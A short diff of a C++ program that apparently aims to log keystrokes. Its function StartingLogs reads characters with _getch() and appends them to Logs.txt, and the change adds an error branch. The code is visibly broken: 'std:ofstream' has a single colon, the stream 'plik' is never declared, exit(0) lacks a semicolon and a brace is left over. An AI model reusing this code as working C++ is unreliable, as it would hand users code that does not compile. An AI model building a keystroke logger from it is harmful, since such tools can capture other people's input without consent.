@@ -4,6 +4,7 @@
 #include <winuser.h>
 #include <conio.h>
 using namespace std;
+char x;
 void StartingLogs()
 {
   std:ofstream outf("Logs.txt");
@@ -12,8 +13,14 @@ void StartingLogs()
   logs.open("Logs.txt", ios::app);
   if(logs.is_open())
   {
-    logs<<_getch();
+    x=_getch();
+    logs<<x;
     logs.close();
+  }
+  if(plik.good()!=true)
+  {
+    logs<<"Error";
+    exit(0)
   }
 }
 }
